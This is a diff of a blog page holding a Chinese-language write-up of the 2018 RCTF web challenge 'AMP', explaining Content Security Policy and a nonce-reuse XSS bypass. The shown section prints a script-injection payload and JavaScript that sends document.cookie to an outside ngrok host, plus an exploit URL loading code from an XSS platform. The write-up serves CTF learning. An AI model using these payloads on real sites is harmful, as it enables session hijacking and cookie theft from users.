@@ -41,7 +41,7 @@
 <meta property="og:image" content="http://omho4boal.bkt.clouddn.com/2018-05-29-15.png">
 <meta property="og:image" content="http://omho4boal.bkt.clouddn.com/2018-05-29-16.png">
 <meta property="og:image" content="http://omho4boal.bkt.clouddn.com/2018-05-29-17.png">
-<meta property="og:updated_time" content="2018-07-06T13:06:59.191Z">
+<meta property="og:updated_time" content="2018-07-06T14:19:27.518Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="它不是 XSS ——记 2018-RCTF一道WEB题：AMP | ——智齿——">
 <meta name="twitter:description" content="恰巧这一次的CTF还真没有关注，比赛完了之后，无意间看到了相关的writeup，大致浏览了下，觉得好像还是有点意思的，于是便趁着比赛环境还在，自己玩了玩。 打开题目地址http://amp.2018.teamrois.cn，可以看到以下这个页面，提示输入name作为请求参数。试着输入http://amp.2018.teamrois.cn/?name=123，传入name参数，可以看到以下返回。可以">
@@ -199,12 +199,13 @@ classes that you can use:
 <p>打开题目地址<code>http://amp.2018.teamrois.cn</code>，可以看到以下这个页面，提示输入name作为请求参数。<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-02.png" alt="image"><br>试着输入<code>http://amp.2018.teamrois.cn/?name=123</code>，传入name参数，可以看到以下返回。<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-03.png" alt="image"><br>可以看到将我们传入的name参数输出到了页面，并且提示说我被攻击，还有一个“STOP TRACKING ME”的按钮，我们点击按钮，先开始一直没有反应，后面发现它使用了谷歌的recaptcha验证码<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-04.png" alt="image"><br>我们通过验证之后，得到<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-05.png" alt="image"><br>显示已经记录下了我们的request，并且联系了admin。<br>到这一步，就想到了CTF惯用套路。查看网络请求，果然在cookie中找到了提示信息：”flag_is_in_admin_cookie”。<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-06.png" alt="image"><br>综合以上信息：name参数会在页面输出；request会记录并发送给admin；flag_is_in_admin_cookie 。想当然的就以为是xss，所以接下来就开始测试name参数，<code>http://amp.2018.teamrois.cn/?name=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>发现并没有弹窗，打开调试看一下<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-07.png" alt="image"><br>可见，其使用了内容安全策略（CSP）。<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-08.jpg" alt="image"><br>Content Security Policy（CSP）内容安全策略，是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。通过定义一个名为Content-Security-Policy 的header来让浏览器仅载入可信域的资源文件，限制使用内联脚本，禁止页面中使用<code>&lt;script&gt;</code>标签，控制ajax请求域等等。<br>攻击者想要窃取数据，用户浏览器就必须和攻击者的某个地址进行通信，否则攻击者就没有办法接收到最终窃取到的信息结果，而CSP可以用来定义哪些域是被信任的，如果攻击者设定的域不属于被设定的信任域，那么信息就没有办法被偷出去。这样就起到了防御XSS的效果（如果想更深层次的了解CSP，可自行百度）。    </p>
 <p>此处的CSP设置了一个<code>script-src</code>值，该属性开启将对当前页面上可执行的JS源进行了限制。<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-09.png" alt="image"><br>从页面源代码可以看到，每一个引用的javascript代码（script标签）都有一个nonce字段，其value值是服务器端动态的生成字符串，只有包含nonce字段并且字符串值与服务端相等的script块才可以被执行。从上图中可以看出该实例中，nonce值固定不变。<br>我们下来就尝试绕过。</p>
 <p>针对nonce的绕过，我们一般是利用页面上xss可利用点之后较近的js引用中的nonce字段值。举例来说就是：</p>
-<p>对于以下代码<br>`</p><p>xss插入点</p><p></p>
-<p><script src="http://www.google.com/recaptcha/api.js" nonce="1dda8fc2ac73eaeff4292117028b4562">…</script>`<br>我们可以在xss插入点，输入以下内容：</p>
+<p>对于以下代码</p>
+<pre><code>&lt;p&gt;xss插入点&lt;/p&gt;
+&lt;script src=&quot;http://www.google.com/recaptcha/api.js&quot; nonce=&quot;1dda8fc2ac73eaeff4292117028b4562&quot;&gt;...&lt;/script&gt;
+</code></pre><p>我们可以在xss插入点，输入以下内容：</p>
 <pre><code>&lt;script src=&quot;http://xxx.xxx.xxx.xxx/test.js&quot; a=&quot;
-</code></pre><p>此时，页面就变为：<br>`</p><p>&lt;script src=”<a href="http://xxx.xxx.xxx.xxx/test.js&quot;" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx/test.js&quot;</a> a=”</p><p></p>
-<p><script src="http://www.google.com/recaptcha/api.js" nonce="1dda8fc2ac73eaeff4292117028b4562">…</script><code>此时，我们可控的xss插入点已经包含了nonce字段值，进而绕过了CSP。
-在本题中，我们使用xss平台构造，其中的自定义代码如下：</code>var img = document.createElement(‘img’);<br>img.src = ‘<a href="http://ec492eb4.ngrok.io/flag=&#39;+encodeURIComponent(document.cookie);`" target="_blank" rel="noopener">http://ec492eb4.ngrok.io/flag=&#39;+encodeURIComponent(document.cookie);`</a><br>创建一个img标签，在标签的src中将cookie值作为flag参数值，来访问本地的ngrox。</p>
+</code></pre><p>此时，页面就变为：<br>    </p><p>&lt;script src=”<a href="http://xxx.xxx.xxx.xxx/test.js&quot;" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx/test.js&quot;</a> a=”</p><br>    <script src="http://www.google.com/recaptcha/api.js" nonce="1dda8fc2ac73eaeff4292117028b4562">…</script><br>此时，我们可控的xss插入点已经包含了nonce字段值，进而绕过了CSP。<br>在本题中，我们使用xss平台构造，其中的自定义代码如下：<br><code>var img = document.createElement(&#39;img&#39;);
+img.src = &#39;http://ec492eb4.ngrok.io/flag=&#39;+encodeURIComponent(document.cookie);</code><br>创建一个img标签，在标签的src中将cookie值作为flag参数值，来访问本地的ngrox。<p></p>
 <p>我们构造的xss利用代码为：<br>    <a href="http://amp.2018.teamrois.cn/?name=" target="_blank" rel="noopener">http://amp.2018.teamrois.cn/?name=</a>&lt;script src=”<a href="https://xsspt.com/Ov7T0a?15283&quot;" target="_blank" rel="noopener">https://xsspt.com/Ov7T0a?15283&quot;</a> a=”<br>访问上述链接，发现并没有自己想的那么简单，获得到的仍然是提示，并不是真正的flag值。</p>
 <p>到这里，能想到的思路都试验了。回过头来发现这道题的题目是AMP,所以重新从AMP下手。</p>
 <p><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-10.jpg" alt="image"></p>
